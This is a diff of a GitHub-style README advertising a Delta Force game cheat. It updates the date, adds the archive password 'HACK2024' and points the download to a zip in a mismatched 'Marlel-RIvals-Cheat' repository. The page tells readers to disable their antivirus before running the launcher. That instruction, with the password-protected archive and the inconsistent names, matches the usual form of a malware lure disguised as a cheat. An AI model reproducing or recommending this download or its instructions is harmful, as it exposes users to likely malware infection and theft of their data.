@@ -1,13 +1,15 @@
-<h1 align="center">WORKING (DATE: DECEMBER 2024)
+<h1 align="center">WORKING (DATE: JANUARY 2025)
 
   BEFORE USE DISABLE YOUR ANTIVIRUS (CHECKER USE NETWORK FOR BYPASS ANTICHEAT)</h1>
 
 <h2 align="center">
-  CHEAT FOR DELTA FORCE RELEASE
+  CHEAT FOR DELTAFORCE
+  PASS - HACK2024
 </h2>
 
 <h3 align="center">
 Please leave a ⭐  if you like it
+</h3>
 
+  ## [DOWNLOAD](https://github.com/whyaliveagain/Marlel-RIvals-Cheat/releases/download/hack/ExpLauncher.zip)
 
-  ## [DOWNLOAD](https://github.com/whyaliveagain/Delta-Force-Hawk-Ops-cheat/releases/download/hack/ExpLauncher.zip)
